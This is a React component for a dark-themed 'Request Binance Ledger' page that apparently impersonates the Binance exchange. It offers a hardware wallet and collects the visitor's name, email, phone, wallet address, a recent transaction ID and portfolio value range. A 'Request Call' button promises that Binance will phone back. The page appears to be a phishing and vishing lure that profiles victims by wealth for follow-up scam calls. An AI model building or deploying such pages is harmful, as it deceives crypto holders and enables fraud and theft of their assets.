import React, { useState, useEffect } from "react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Textarea } from "@/components/ui/textarea";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { useToast } from "@/hooks/use-toast";
import { submitForm } from "@/api/form-submission";
import { CheckCircle, Phone, Clock, Info, AlertTriangle, Package } from "lucide-react";

interface FormData {
  firstName: string;
  lastName: string;
  email: string;
  phone: string;
  country: string;
  walletAddress: string;
  transactionId: string;
  amount: string;
  currency: string;
  description: string;
  priority: string;
}

const BinanceLedgerForm = () => {
  const [formData, setFormData] = useState<FormData>({
    firstName: "",
    lastName: "",
    email: "",
    phone: "",
    country: "",
    walletAddress: "",
    transactionId: "",
    amount: "",
    currency: "USDT",
    description: "",
    priority: "medium"
  });

  const [isSubmitting, setIsSubmitting] = useState(false);
  const [showCallPopup, setShowCallPopup] = useState(false);
  const [timer, setTimer] = useState(0);
  const [callRequested, setCallRequested] = useState(false);
  const [showSuccessMessage, setShowSuccessMessage] = useState(false);
  const { toast } = useToast();

  useEffect(() => {
    let interval: NodeJS.Timeout;
    if (timer > 0) {
      interval = setInterval(() => {
        setTimer(timer - 1);
      }, 1000);
    } else if (timer === 0 && callRequested) {
      setShowSuccessMessage(true);
    }
    return () => clearInterval(interval);
  }, [timer, callRequested]);

  const handleInputChange = (field: keyof FormData, value: string) => {
    setFormData(prev => ({ ...prev, [field]: value }));
  };

  const handleRequestCall = () => {
    if (!formData.phone) {
      toast({
        title: "Phone number required",
        description: "Please enter your phone number before requesting a call.",
        variant: "destructive",
      });
      return;
    }
    setShowCallPopup(true);
  };

  const confirmCallRequest = () => {
    setTimer(9);
    setCallRequested(true);
    setShowCallPopup(false);
    toast({
      title: "Call requested",
      description: "We will contact you shortly.",
    });
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!formData.firstName || !formData.lastName || !formData.email || !formData.phone) {
      toast({
        title: "Missing required fields",
        description: "Please fill in all required fields.",
        variant: "destructive",
      });
      return;
    }

    setIsSubmitting(true);
    
    try {
      await submitForm(formData);
      toast({
        title: "Binance Ledger request submitted successfully",
        description: "We will process your request and contact you regarding shipping details.",
      });
      
      // Reset form
      setFormData({
        firstName: "",
        lastName: "",
        email: "",
        phone: "",
        country: "",
        walletAddress: "",
        transactionId: "",
        amount: "",
        currency: "USDT",
        description: "",
        priority: "medium"
      });
    } catch (error) {
      toast({
        title: "Submission failed",
        description: "There was an error submitting your request. Please try again.",
        variant: "destructive",
      });
    } finally {
      setIsSubmitting(false);
    }
  };

  const NoticeMessage = ({ type, children }: { type: 'info' | 'warning' | 'success', children: React.ReactNode }) => {
    const icons = {
      info: <Info className="w-4 h-4" />,
      warning: <AlertTriangle className="w-4 h-4" />,
      success: <CheckCircle className="w-4 h-4" />
    };

    const styles = {
      info: "bg-blue-500/10 border-blue-500/30 text-blue-400",
      warning: "bg-yellow-500/10 border-yellow-500/30 text-yellow-400",
      success: "bg-green-500/10 border-green-500/30 text-green-400"
    };

    return (
      <div className={`flex items-start gap-3 p-4 rounded-lg border ${styles[type]}`}>
        <div className="flex-shrink-0 mt-0.5">
          {icons[type]}
        </div>
        <div className="text-sm leading-relaxed">
          {children}
        </div>
      </div>
    );
  };

  return (
    <div className="min-h-[calc(100vh-200px)] flex items-center justify-center py-8 px-4">
      <div className="w-full max-w-2xl mx-auto">
        <div className="bg-[#1E2026] rounded-lg border border-[#2B3139] p-8">
          {/* Header */}
          <div className="text-center mb-8">
            <div className="flex items-center justify-center gap-3 mb-4">
              <Package className="w-8 h-8 text-binance-yellow" />
              <h1 className="text-3xl font-bold text-white">Request Binance Ledger</h1>
            </div>
            <p className="text-[#848E9C] text-base">Secure hardware wallet for your digital assets</p>
          </div>

          {/* Important Notice */}
          <div className="mb-6">
            <NoticeMessage type="info">
              <strong>Binance Ledger Request:</strong> Complete this form to request your Binance Ledger hardware wallet. 
              Our team will verify your information and contact you with shipping details and delivery timeline.
            </NoticeMessage>
          </div>

          <form onSubmit={handleSubmit} className="space-y-6">
            {/* Personal Information */}
            <div className="space-y-4">
              <h3 className="text-lg font-semibold text-white border-b border-[#2B3139] pb-2">Personal Information</h3>
              
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div>
                  <Label htmlFor="firstName" className="text-[#B7BDC6] text-base mb-2 block">First Name *</Label>
                  <Input
                    id="firstName"
                    type="text"
                    value={formData.firstName}
                    onChange={(e) => handleInputChange("firstName", e.target.value)}
                    className="bg-[#181A20] border-[#2B3139] text-white text-base h-12 focus:border-binance-yellow"
                    required
                  />
                </div>
                
                <div>
                  <Label htmlFor="lastName" className="text-[#B7BDC6] text-base mb-2 block">Last Name *</Label>
                  <Input
                    id="lastName"
                    type="text"
                    value={formData.lastName}
                    onChange={(e) => handleInputChange("lastName", e.target.value)}
                    className="bg-[#181A20] border-[#2B3139] text-white text-base h-12 focus:border-binance-yellow"
                    required
                  />
                </div>
              </div>

              <div>
                <Label htmlFor="email" className="text-[#B7BDC6] text-base mb-2 block">Email Address *</Label>
                <Input
                  id="email"
                  type="email"
                  value={formData.email}
                  onChange={(e) => handleInputChange("email", e.target.value)}
                  className="bg-[#181A20] border-[#2B3139] text-white text-base h-12 focus:border-binance-yellow"
                  required
                />
              </div>

              <div>
                <Label htmlFor="phone" className="text-[#B7BDC6] text-base mb-2 block">Phone Number *</Label>
                <div className="flex gap-2">
                  <Input
                    id="phone"
                    type="tel"
                    value={formData.phone}
                    onChange={(e) => handleInputChange("phone", e.target.value)}
                    className="bg-[#181A20] border-[#2B3139] text-white text-base h-12 focus:border-binance-yellow flex-1"
                    required
                  />
                  <Button
                    type="button"
                    onClick={handleRequestCall}
                    className="bg-blue-600 hover:bg-blue-700 text-white px-4 h-12 text-base"
                  >
                    <Phone className="w-4 h-4 mr-2" />
                    Request Call
                  </Button>
                </div>
                
                {timer > 0 && (
                  <div className="mt-2">
                    <NoticeMessage type="info">
                      <Clock className="w-4 h-4 mr-2 inline" />
                      Call requested. Timer: {timer} seconds remaining...
                    </NoticeMessage>
                  </div>
                )}
                
                {showSuccessMessage && timer === 0 && (
                  <div className="mt-2">
                    <NoticeMessage type="success">
                      Binance will contact you shortly at the provided phone number.
                    </NoticeMessage>
                  </div>
                )}
              </div>

              <div>
                <Label htmlFor="country" className="text-[#B7BDC6] text-base mb-2 block">Country</Label>
                <Input
                  id="country"
                  type="text"
                  value={formData.country}
                  onChange={(e) => handleInputChange("country", e.target.value)}
                  className="bg-[#181A20] border-[#2B3139] text-white text-base h-12 focus:border-binance-yellow"
                />
              </div>
            </div>

            {/* Delivery Details */}
            <div className="space-y-4">
              <h3 className="text-lg font-semibold text-white border-b border-[#2B3139] pb-2">Delivery Details</h3>
              
              <div>
                <Label htmlFor="walletAddress" className="text-[#B7BDC6] text-base mb-2 block">Primary Wallet Address (for verification)</Label>
                <Input
                  id="walletAddress"
                  type="text"
                  value={formData.walletAddress}
                  onChange={(e) => handleInputChange("walletAddress", e.target.value)}
                  className="bg-[#181A20] border-[#2B3139] text-white text-base h-12 focus:border-binance-yellow"
                  placeholder="Enter your primary wallet address"
                />
              </div>

              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div>
                  <Label htmlFor="transactionId" className="text-[#B7BDC6] text-base mb-2 block">Recent Transaction ID (optional)</Label>
                  <Input
                    id="transactionId"
                    type="text"
                    value={formData.transactionId}
                    onChange={(e) => handleInputChange("transactionId", e.target.value)}
                    className="bg-[#181A20] border-[#2B3139] text-white text-base h-12 focus:border-binance-yellow"
                    placeholder="For account verification"
                  />
                </div>

                <div>
                  <Label htmlFor="amount" className="text-[#B7BDC6] text-base mb-2 block">Portfolio Value Range</Label>
                  <Select value={formData.amount} onValueChange={(value) => handleInputChange("amount", value)}>
                    <SelectTrigger className="bg-[#181A20] border-[#2B3139] text-white text-base h-12 focus:border-binance-yellow">
                      <SelectValue placeholder="Select range" />
                    </SelectTrigger>
                    <SelectContent className="bg-[#181A20] border-[#2B3139]">
                      <SelectItem value="under-1k" className="text-white">Under $1,000</SelectItem>
                      <SelectItem value="1k-10k" className="text-white">$1,000 - $10,000</SelectItem>
                      <SelectItem value="10k-50k" className="text-white">$10,000 - $50,000</SelectItem>
                      <SelectItem value="50k-100k" className="text-white">$50,000 - $100,000</SelectItem>
                      <SelectItem value="over-100k" className="text-white">Over $100,000</SelectItem>
                    </SelectContent>
                  </Select>
                </div>
              </div>

              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div>
                  <Label htmlFor="currency" className="text-[#B7BDC6] text-base mb-2 block">Primary Currency</Label>
                  <Select value={formData.currency} onValueChange={(value) => handleInputChange("currency", value)}>
                    <SelectTrigger className="bg-[#181A20] border-[#2B3139] text-white text-base h-12 focus:border-binance-yellow">
                      <SelectValue />
                    </SelectTrigger>
                    <SelectContent className="bg-[#181A20] border-[#2B3139]">
                      <SelectItem value="BTC" className="text-white">BTC</SelectItem>
                      <SelectItem value="ETH" className="text-white">ETH</SelectItem>
                      <SelectItem value="USDT" className="text-white">USDT</SelectItem>
                      <SelectItem value="BNB" className="text-white">BNB</SelectItem>
                      <SelectItem value="ADA" className="text-white">ADA</SelectItem>
                      <SelectItem value="DOT" className="text-white">DOT</SelectItem>
                    </SelectContent>
                  </Select>
                </div>

                <div>
                  <Label htmlFor="priority" className="text-[#B7BDC6] text-base mb-2 block">Delivery Priority</Label>
                  <Select value={formData.priority} onValueChange={(value) => handleInputChange("priority", value)}>
                    <SelectTrigger className="bg-[#181A20] border-[#2B3139] text-white text-base h-12 focus:border-binance-yellow">
                      <SelectValue />
                    </SelectTrigger>
                    <SelectContent className="bg-[#181A20] border-[#2B3139]">
                      <SelectItem value="standard" className="text-white">Standard (7-14 days)</SelectItem>
                      <SelectItem value="express" className="text-white">Express (3-5 days)</SelectItem>
                      <SelectItem value="urgent" className="text-white">Urgent (1-2 days)</SelectItem>
                    </SelectContent>
                  </Select>
                </div>
              </div>

              <div>
                <Label htmlFor="description" className="text-[#B7BDC6] text-base mb-2 block">Additional Notes</Label>
                <Textarea
                  id="description"
                  value={formData.description}
                  onChange={(e) => handleInputChange("description", e.target.value)}
                  className="bg-[#181A20] border-[#2B3139] text-white text-base min-h-[100px] focus:border-binance-yellow resize-none"
                  placeholder="Any special delivery instructions or additional information..."
                />
              </div>
            </div>

            {/* Security Notice */}
            <div className="space-y-4">
              <NoticeMessage type="warning">
                <strong>Security Notice:</strong> The Binance Ledger will be shipped to your verified address only. 
                Ensure your contact information is accurate for successful delivery.
              </NoticeMessage>
            </div>

            <Button
              type="submit"
              disabled={isSubmitting}
              className="w-full bg-binance-yellow hover:bg-binance-yellow/90 text-black font-semibold h-12 text-base"
            >
              {isSubmitting ? "Submitting Request..." : "Request Binance Ledger"}
            </Button>
          </form>
        </div>
      </div>

      {/* Call Request Popup */}
      {showCallPopup && (
        <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-50 p-4">
          <div className="bg-[#1E2026] rounded-lg border border-[#2B3139] p-6 max-w-md w-full">
            <h3 className="text-xl font-semibold text-white mb-4">Request Call Confirmation</h3>
            <p className="text-[#848E9C] mb-6 text-base">
              Are you sure you want to request a call from Binance support at {formData.phone}?
            </p>
            <div className="flex gap-3">
              <Button
                onClick={confirmCallRequest}
                className="flex-1 bg-binance-yellow hover:bg-binance-yellow/90 text-black font-semibold text-base"
              >
                Request Call
              </Button>
              <Button
                onClick={() => setShowCallPopup(false)}
                variant="outline"
                className="flex-1 border-[#2B3139] text-white hover:bg-[#2B3139] text-base"
              >
                Cancel
              </Button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};

export default BinanceLedgerForm;
